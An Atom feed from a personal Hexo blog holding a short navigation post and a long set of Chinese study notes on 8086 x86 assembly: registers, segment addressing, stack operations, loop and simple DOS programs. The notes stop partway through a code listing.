<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>v5le0n9&#39;s garden</title>
  
  <subtitle>小凉的秘密基地</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-11T05:35:24.596Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>v5le0n9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>README</title>
    <link href="http://example.com/posts/77cd4175.html"/>
    <id>http://example.com/posts/77cd4175.html</id>
    <published>2022-04-11T05:27:33.039Z</published>
    <updated>2022-04-11T05:35:24.596Z</updated>
    
    <content type="html"><![CDATA[<p>由于之前手贱把整个博客给删了，导致现在这个博客里的文章排序非常混乱，本强迫症患者实在有点看不下去，用hexo的文章置顶插件也不太理想，所以干脆用此做个导航贴。</p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;p&gt;由于之前手贱把整个博客给删了，导致现在这个博客里的文章排序非常混乱，本强迫症患者实在有点看不下去，用hexo的文章置顶插件也不太理想，所以干脆用此做个导航贴。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>x86汇编基础</title>
    <link href="http://example.com/posts/de6e58e0.html"/>
    <id>http://example.com/posts/de6e58e0.html</id>
    <published>2022-04-11T05:16:29.411Z</published>
    <updated>2022-04-11T05:23:04.542Z</updated>
    
    <content type="html"><![CDATA[<p>很久之前看王爽老师的《汇编语言》写的笔记，可能不太准确，先做个存档吧。</p><span id="more"></span><h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><p>汇编指令是机器指令的助记符，同机器指令一一对应。</p><p>每一种CPU都有自己的汇编指令集。</p><p>CPU可以直接使用的信息在存储器中存放。</p><p>指令和数据没有任何区别，都是二进制信息。</p><p>存储单元从零开始顺序编号。</p><p>存储器的存储单元可以存储1B，即8个二进制位。微机存储器的容量是以<strong>字节</strong>为最小单位来计算的。</p><p>1B=8b, 1KB=1024B, 1MB=1024KB, 1GB=1024MB, 1TB=1024GB</p><p>地址总线：</p><ul><li>CPU是通过地址总线来指定存储单元的</li><li>地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址</li><li>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N，这样的CPU最多可以寻找2的N次方个内存单元(B)</li></ul><p>数据总线：</p><ul><li>CPU与内存或其他器件之间的数据传送是通过数据总线来进行的</li><li>数据总线的宽度决定了CPU和外界的数据传送速度，8根数据总线一次可传送一个8位二进制数据(即1B)</li></ul><p>控制总线：</p><ul><li>CPU对外部器件的控制是通过控制总线来进行的</li><li>有多少根控制总线就意味着CPU提供了对外部器件的多少种控制</li><li>控制总线的宽度决定了CPU对外部器件的控制能力</li></ul><h1 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2. 寄存器"></a>2. 寄存器</h1><p>内部总线实现CPU内部各个器件之间的连接，外部总线实现CPU和主板上其他器件的联系。</p><h2 id="2-1-通用寄存器"><a href="#2-1-通用寄存器" class="headerlink" title="2.1 通用寄存器"></a>2.1 通用寄存器</h2><p>AX, BX, CX, DX</p><p>以AX为例，数据18，二进制表示10010，小端序</p><div class="table-container"><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th>AX</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td></tr><tr><td></td><td></td><td>8~15</td><td>AH</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>0~7</td><td>AL</td><td></td><td></td></tr></tbody></table></div><p>AH和AL可以看成是一个字型数据的高8位和低8位，也可以看成是两个独立的字节型数据。</p><h2 id="2-2-几条汇编指令"><a href="#2-2-几条汇编指令" class="headerlink" title="2.2 几条汇编指令"></a>2.2 几条汇编指令</h2><p><img src="F:\markdown图片\汇编语言\汇编指令举例.png" alt="汇编指令举例"></p><p>汇编指令不区分大小写。</p><p>原AX=0000H，BX=0000H</p><div class="table-container"><table><thead><tr><th>程序段中的指令</th><th>指令执行后AX中的数据</th><th>指令执行后BX中的数据</th></tr></thead><tbody><tr><td>mov ax, 4E20H</td><td>4E20H</td><td>0000H</td></tr><tr><td>add ax, 1406H</td><td>6226H</td><td>0000H</td></tr><tr><td>mov bx, 2000H</td><td>6226H</td><td>2000H</td></tr><tr><td>add ax, bx</td><td>8226H</td><td>2000H</td></tr><tr><td>mov bx, ax</td><td>8226H</td><td>8226H</td></tr><tr><td>add ax, bx</td><td><strong>044CH</strong></td><td>8226H</td></tr></tbody></table></div><h2 id="2-3-物理地址"><a href="#2-3-物理地址" class="headerlink" title="2.3 物理地址"></a>2.3 物理地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">物理地址=段地址×16+偏移地址=基础地址+偏移地址</span><br></pre></td></tr></table></figure><p>CPU可以用不同的段地址和偏移地址形成同一个物理地址。</p><p>偏移地址16位，变化范围0~FFFFH，仅用偏移地址来寻址最多可寻$2^{16}B=2^{6}KB=64KB$个内存单元。</p><h2 id="2-4-CS-和-IP"><a href="#2-4-CS-和-IP" class="headerlink" title="2.4 CS 和 IP"></a>2.4 CS 和 IP</h2><p>CS为代码段寄存器(存放段地址)，IP为指令指针寄存器(存放偏移地址)。</p><p>同时修改CS、IP的内容：jmp 段地址：偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 3:0B16执行后：CS=0003H,IP=0B16H,CPU将从00030H+0B16H=00B46H处读取指令</span><br></pre></td></tr></table></figure><p>仅修改IP的内容：jmp 某一合法寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp ax执行指令前：ax=1000H,CS=2000H,IP=0003H</span><br><span class="line">执行指令后：ax=1000H,CS=2000H,IP=1000H</span><br></pre></td></tr></table></figure><p>8086CPU工作过程：</p><ol><li>从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器</li><li>IP指向下一条指令</li><li>执行指令（转到1，重复）</li></ol><h1 id="3-内存访问"><a href="#3-内存访问" class="headerlink" title="3. 内存访问"></a>3. 内存访问</h1><p>字单元：存放一个字型数据(16位)的内存单元，由两个地址连续的内存单元组成。高地址内存单元中存放字型数据的高位字节，低地址内存单元中存放字型数据的低位字节。</p><p>起始地址为N的字单元简称为N地址字单元。比如一个字单元由2、3两个内存单元组成，则这个字单元的起始地址为2。</p><h2 id="3-1-DS-和-address"><a href="#3-1-DS-和-address" class="headerlink" title="3.1 DS 和 [address]"></a>3.1 DS 和 [address]</h2><p>DS为数据段寄存器(存放段地址)，[address]表示一个内存单元(存放偏移地址)。</p><h2 id="3-2-mov指令-add、sub指令同"><a href="#3-2-mov指令-add、sub指令同" class="headerlink" title="3.2 mov指令(add、sub指令同)"></a>3.2 mov指令(add、sub指令同)</h2><ol><li>将数据直接送入寄存器：mov 寄存器，数据</li><li><p>将一个寄存器中的内容送人另一个寄存器：mov 寄存器，寄存器</p></li><li><p>将一个内存单元中的内容送入一个寄存器中：mov 寄存器，内存单元地址</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将10000H(1000:0)中的数据读到al中:</span><br><span class="line">mov bx, 1000H</span><br><span class="line">mov ds, bx</span><br><span class="line">mov al, [0]</span><br></pre></td></tr></table></figure><ol><li>mov 内存单元，寄存器</li><li>mov 段寄存器，寄存器</li></ol><p>8086CPU不支持将数据直接送入段寄存器的操作，ds是一个段寄存器，所以<code>mov ds,1000H</code>这条指令是非法的，只好用一个寄存器来进行中转，即先将1000H送入一个通用寄存器，再将通用寄存器的内容送入ds。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将al中的数据送入内存单元10000H中:</span><br><span class="line">mov bx, 1000H</span><br><span class="line">mov ds, bx</span><br><span class="line">mov [0], al</span><br></pre></td></tr></table></figure><h2 id="3-3-CPU提供的栈机制"><a href="#3-3-CPU提供的栈机制" class="headerlink" title="3.3 CPU提供的栈机制"></a>3.3 CPU提供的栈机制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ax 表示将寄存器ax中的数据送入栈中</span><br><span class="line">pop ax 表示从栈顶取出数据送入ax</span><br></pre></td></tr></table></figure><p>8086CPU的入栈和出栈操作都是以字为单位进行的。</p><p>CPU如何知道栈顶位置？SS:SP，任意时刻，SS:SP指向栈顶元素。</p><p>push ax由以下两步完成：</p><ol><li>SP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶</li><li>将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶</li></ol><p>pop ax由以下两步完成：</p><ol><li>将SS:SP指向的内存单元处的数据送入ax中</li><li>SP=SP+2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶</li></ol><h2 id="3-4-push指令-pop指令同"><a href="#3-4-push指令-pop指令同" class="headerlink" title="3.4 push指令(pop指令同)"></a>3.4 push指令(pop指令同)</h2><ol><li>将一个寄存器中的数据入栈：push 寄存器</li><li>将一个段寄存器中的数据入栈：push 段寄存器</li><li>将一个内存字单元处的字入栈：push 内存单元</li></ol><p>指令执行时，CPU要知道内存单元的地址，可以在push、pop指令中只给出内存单元的偏移地址，段地址在指令执行时，CPU从DS中取得。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">push [0];将1000:0处的字压入栈</span><br><span class="line">pop [2];出栈的数据送入1000:2处</span><br></pre></td></tr></table></figure><p>将10000H~1000FH这段空间当作栈，初始状态栈是空的，将ax, bx, DS中的数据入栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax;设置栈的段地址</span><br><span class="line">mov sp,0010H;设置栈的偏移地址,因栈为空,所以sp=000FH+0002H=0010H</span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">push ds</span><br></pre></td></tr></table></figure><p>push、pop等栈操作指令，修改的只是SP。也就是说，栈顶的变化范围最大为0~FFFFH</p><p>一个栈段的容量最大为64KB。</p><p>在10000H处写入字型数据2266H</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,2266H</span><br><span class="line">mov [0],ax</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,2</span><br><span class="line">mov ax,2266H</span><br><span class="line">push ax</span><br></pre></td></tr></table></figure><h2 id="3-5-段的综述"><a href="#3-5-段的综述" class="headerlink" title="3.5 段的综述"></a>3.5 段的综述</h2><p>对于数据段，将它的段地址放在DS中，用mov、add、sub等访问内存单元的指令时，CPU就将我们定义的数据段中的内容当作数据来访问。</p><p>对于代码段，将它的段地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码中的指令。</p><p>对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在需要进行栈操作的时候，比如执行push、pop指令等，就将我们定义的栈段当作栈空间来用。</p><p>CPU将内存中的某段内容当作代码，是因CS:IP指向了那里；CPU将某段内存当作栈，是因为SS:SP指向了那里。</p><h1 id="4-第一个程序"><a href="#4-第一个程序" class="headerlink" title="4. 第一个程序"></a>4. 第一个程序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br><span class="line">add ax,ax</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>在汇编语言程序中包含两种指令：伪指令、汇编指令。汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。伪指令没有对应的机器指令，最终不被CPU执行。伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作。</p><h2 id="4-1-伪指令"><a href="#4-1-伪指令" class="headerlink" title="4.1 伪指令"></a>4.1 伪指令</h2><h3 id="4-1-1-XXX-segment-……-XXX-ends"><a href="#4-1-1-XXX-segment-……-XXX-ends" class="headerlink" title="4.1.1 XXX segment …… XXX ends"></a>4.1.1 XXX segment …… XXX ends</h3><p>segment和ends的功能是定义一个段，segment说明一个段开始，ends说明一个段结束。</p><p>一个有意义的汇编程序中至少要有一个段，这个段用来存放代码。</p><h3 id="4-1-2-end"><a href="#4-1-2-end" class="headerlink" title="4.1.2 end"></a>4.1.2 end</h3><p>end是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令end，就结束对源程序的编译。</p><h3 id="4-1-3-assume"><a href="#4-1-3-assume" class="headerlink" title="4.1.3 assume"></a>4.1.3 assume</h3><p>这条伪指令的含义为“假设”，它假设某一段寄存器和程序中的某一个用segment…ends定义的段相关联。通过assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系。</p><h2 id="4-2-汇编指令"><a href="#4-2-汇编指令" class="headerlink" title="4.2 汇编指令"></a>4.2 汇编指令</h2><h2 id="4-3-标号"><a href="#4-3-标号" class="headerlink" title="4.3 标号"></a>4.3 标号</h2><p>一个标号指代了一个地址，比如“codesg”。codesg在segment前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址。</p><h2 id="4-4-程序的结构"><a href="#4-4-程序的结构" class="headerlink" title="4.4 程序的结构"></a>4.4 程序的结构</h2><p>编程运算$2^3$</p><ol><li>定义一个段，名称为abc</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure><ol><li>在这个段中写入汇编指令，来实现我们的任务</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure><ol><li>指出程序要在何处结束</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol><li>abc被当作代码段来用，所以应该将abc和cs联系起来</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol><li>程序返回</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol><li>语法错误和逻辑错误</li></ol><h2 id="4-5-编译"><a href="#4-5-编译" class="headerlink" title="4.5 编译"></a>4.5 编译</h2><p>源程序文件.asm-&gt;目标文件.obj</p><h2 id="4-6-连接"><a href="#4-6-连接" class="headerlink" title="4.6 连接"></a>4.6 连接</h2><p>目标文件.obj-&gt;可执行文件.exe</p><h1 id="5-bx-和loop指令"><a href="#5-bx-和loop指令" class="headerlink" title="5. [bx]和loop指令"></a>5. [bx]和loop指令</h1><p>[bx]同样表示一个内存单元，它的偏移地址在bx中。</p><p>“()”中的元素可以有3种类型：①寄存器名；②段寄存器名；③内存单元的物理地址。</p><p>(ax)表示ax中的内容，(20000H)表示内存20000H单元的内容，((ds)<em>16+(bx))表示ds中的内容为ADR1，bx中的内容为ADR2，内存ADR1\</em>16+ADR2单元的内容，即内存ADR1:ADR2单元的内容。</p><p>约定idata表示常量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[idata]</span><br><span class="line">mov ax,idata</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx];(ax)=((ds)*16+(bx))</span><br><span class="line">mov [bx],ax;((ds)*16+(bx))=(ax)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc bx;inc bx的含义是bx中的内容加1</span><br></pre></td></tr></table></figure><h2 id="5-1-loop指令"><a href="#5-1-loop指令" class="headerlink" title="5.1 loop指令"></a>5.1 loop指令</h2><p>loop指令的格式：loop 标号</p><p>CPU执行loop指令的时候要进行两步操作：</p><ol><li>(cx)=(cx)-1</li><li>判断cx中的值，不为零则转至标号处执行程序，为零则向下执行</li></ol><p>编程运算$2^{12}$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,2</span><br><span class="line">mov cx,11</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>cx和loop指令相配合实现循环功能：①在cx中存放循环次数；②loop指令中的标号所标识地址要在前面；③要循环执行的程序段，要写在标号和loop指令的中间。</p><p><strong>在汇编源程序，数据不能以字母开头</strong>，所以要在前面加0。<code>A000H</code>在汇编源程序中要写为<code>0A000H</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,[0];(al)=0,将常量0送入al中(mov al,0含义相同)</span><br><span class="line">mov al,ds:[0];(al)=((ds)*16+0),将内存单元中的数据送入al中</span><br><span class="line">mov al,[bx];(al)=((ds)*16+(bx)),将内存单元中的数据送入al中</span><br><span class="line">mov al,ds:[bx];与mov al,[bx]含义相同</span><br></pre></td></tr></table></figure><p>（1）在汇编源程序中，如果用指令访问一个内存单元，则在指令中必须用”[]“来表示存储单元，如果在”[]“里用一个常量idata直接给出内存单元的偏移地址，就要在”[]“的前面显式地给出段地址所在的寄存器。比如<code>mov al,ds:[0]</code></p><p>如果没有在”[]“的前面显式地给出段地址所在的段寄存器，那么编译器会把指令中的[idata]解释为data，比如<code>mov al,[0]</code></p><p>（2）如果在”[]“里用寄存器，比如bx，间接给出内存单元的偏移地址，则段地址默认在ds中。当然也可以显式地给出段地址所在的段寄存器。</p><h2 id="5-2-一段安全的空间"><a href="#5-2-一段安全的空间" class="headerlink" title="5.2 一段安全的空间"></a>5.2 一段安全的空间</h2><p>我们需要直接向一段内存中写入内容，这段内存空间不应存放系统或其他程序的数据或代码，否则写入操作很可能引发错误。DOS方式下，一般情况，0:200~0:2ff空间中没有系统或其他程序的数据或代码。</p><h2 id="5-3-loop和-bx-的联合应用"><a href="#5-3-loop和-bx-的联合应用" class="headerlink" title="5.3 loop和[bx]的联合应用"></a>5.3 loop和[bx]的联合应用</h2><p>在循环中，源始单元ffff:X和目标单元0020:X的偏移地址X是变量，可以用bx来存放。</p><h2 id="5-4-段前缀"><a href="#5-4-段前缀" class="headerlink" title="5.4 段前缀"></a>5.4 段前缀</h2><p><img src="F:\markdown图片\汇编语言\段前缀.PNG" alt="段前缀"></p><h1 id="6-包含多个段的程序"><a href="#6-包含多个段的程序" class="headerlink" title="6. 包含多个段的程序"></a>6. 包含多个段的程序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:add ax,cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>dw即define word，定义字型数据。</p><p>程序在运行的时候CS中存放代码段的段地址，所以可以从CS中得到它们的段地址。dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是cs:0, cs:2, cs:4, cs:6, cs:8, cs:a, cs:c, cs:e。</p><p>end除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方。<code>end 标号</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">start:mov bx,0;程序的第一条指令</span><br><span class="line">mov ax,0</span><br><span class="line"></span><br><span class="line">        mov cx,8</span><br><span class="line">    s:add ax,cs:[bx]</span><br><span class="line">        add bx,2</span><br><span class="line">        loop s</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="6-1-在代码段中使用栈"><a href="#6-1-在代码段中使用栈" class="headerlink" title="6.1 在代码段中使用栈"></a>6.1 在代码段中使用栈</h2><p>程序运行时，定义的数据存放在cs:0~cs:F单元中，共8个字单元。依次将这8个字单元中的数据入栈，然后再依次出栈到这8个字单元中，从而实现数据的逆序存放。（将cs:10~cs:2F的内存空间当作栈来用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">;用dw定义16个字型数据，在程序加载后，将取得16个字的内存空间存放这16个数据</span><br><span class="line">;在后面的程序中将这段空间当作栈来使用</span><br><span class="line">start:mov ax,cs</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,30h;将设置栈顶ss:sp指向cs:30</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:push cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;将代码段0~15单元中的8个字型数据依次入栈</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s0:pop cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s0;出栈8个字型数据到代码段0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start;指明程序的入口在start处</span><br></pre></td></tr></table></figure><h2 id="6-2-将数据、代码、栈放入不同的段"><a href="#6-2-将数据、代码、栈放入不同的段" class="headerlink" title="6.2 将数据、代码、栈放入不同的段"></a>6.2 将数据、代码、栈放入不同的段</h2><p>在前面的内容中，我们在程序中用到了数据和栈，将数据、栈和代码都放到了一个段里面。我们在编程的时候要注意何处是数据，何处是栈，何处是代码。这样做会产生两个问题：</p><ol><li>把它们放到一个段中使程序显得混乱</li><li>前面数据中处理的数据很少，用到的栈空间也小，加上没有多长的代码，放到一个段里面没有问题。但如果数据、栈、代码需要的空间超过64KB，就不能放在一个段中（8086模式中一个段的容量不能大于64KB）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line">data segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">data ends</span><br><span class="line">stack segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,stack;将名为stack段的段地址送入ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,20h</span><br><span class="line">;设置栈顶ss:sp指向stack:20(在整个程序中是cs:30,但在栈段是从0:10~0:2F,所以是stack:20)</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax;ds指向data段</span><br><span class="line">mov bx,0;ds:bx指向data段中的第一个单元</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:push [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;将data段中的0~15单元中的8个字型数据依次入栈</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s0:pop [bx]</span><br><span 